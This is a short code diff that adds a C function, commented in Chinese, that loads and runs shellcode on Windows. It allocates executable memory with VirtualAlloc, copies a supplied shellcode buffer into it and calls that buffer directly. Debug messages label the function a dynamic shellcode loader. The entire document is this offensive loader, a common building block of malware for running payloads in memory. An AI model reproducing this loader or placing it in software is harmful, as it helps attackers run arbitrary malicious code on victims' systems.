@@ -1,0 +1,16 @@
+// 动态加载方式：VirtualAlloc + memcpy + 直接执行
+void ExecuteLoader(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 动态加载方式执行Shellcode\n");
+#endif
+    LPVOID exec_mem = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!exec_mem) {
+#ifdef _DEBUG
+        printf("[!] VirtualAlloc失败: %d\n", GetLastError());
+#endif
+        return;
+    }
+    memcpy(exec_mem, shellcode, shellcodeSize);
+    ((void(*)())exec_mem)(); // 直接执行
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}
